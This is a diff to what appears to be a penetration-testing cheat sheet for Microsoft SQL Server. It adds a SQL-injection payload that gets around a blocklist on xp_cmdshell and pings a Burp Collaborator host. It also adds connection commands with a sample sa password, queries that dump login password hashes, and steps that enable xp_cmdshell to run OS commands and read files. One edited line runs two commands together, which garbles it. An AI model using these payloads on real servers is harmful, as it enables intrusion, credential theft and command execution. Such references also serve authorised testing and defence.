@@ -57,16 +57,31 @@ RECONFIGURE
 EXEC master..xp_cmdshell 'whoami'
 
 //Bypass blackisted "EXEC xp_cmdshell"
-‘; DECLARE @x AS VARCHAR(100)=’xp_cmdshell’; EXEC @x ‘ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net’ —
+‘; DECLARE @x AS VARCHAR(100)=’xp_cmdshell’; EXEC @x ‘ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net’ —impacket-mssqlclient machine_name/user@[IP] -windows-auth
 ```
 
-Connect to MSSQL instance with impacket-mssqlclient
+## Connecting to MSSQL
+
+### Using MSSQL-CLI Python utility
 
 ```
-impacket-mssqlclient machine_name/user@[IP] -windows-auth
+python3 -m mssqlcli.main -S [IP] -U sa -P Password123
 ```
 
+## Common SQL Queries
 
+```
+select @@version;
+select loginname from syslogins where sysadmin = 1;
+select name from sys.databases;
+select * from sysusers;
+select name, password_hash FROM master.sys.sql_logins;
+SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name = 'xp_cmdshell';
+EXEC sp_configure 'show advanced options', 1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell', 1;RECONFIGURE
+EXEC xp_cmdshell "whoami"
+EXEC xp_cmdshell "dir C:\"
+EXEC xp_cmdshell "type C:\file.txt"
+```
 
 ## Reverse shell
 
